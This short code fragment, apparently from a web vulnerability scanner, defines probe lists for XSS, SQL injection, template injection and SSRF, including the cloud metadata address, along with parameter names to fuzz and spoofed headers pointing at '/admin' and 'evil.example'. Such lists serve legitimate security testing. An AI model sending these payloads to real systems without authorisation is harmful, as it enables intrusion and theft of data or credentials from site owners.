XSS_PROBES=["<xss>BHXSS</xss>","\"'><svg onx=1 onload=confirm`BHXSS`>","<img src=x onerror=alert('BHXSS')>"]
SQLI_PROBES=["'BHSQL","\"BHSQL","`)BHSQL"," or '1'='1","' union select null--"]
SSTI_PROBES=["${{7*7}}BHSTI","{{7*7}}BHSTI","<% 7*7 %>BHSTI"]
SSRF_PROBES=["http://127.0.0.1:80/","http://169.254.169.254/latest/meta-data/"]
COMMON_KEYS=["q","search","id","redirect","next","url","callback","path","file","template"]
HEADERS_MUTATIONS={"X-Forwarded-For":"8.8.8.8","X-Original-URL":"/admin","X-Forwarded-Host":"evil.example"}
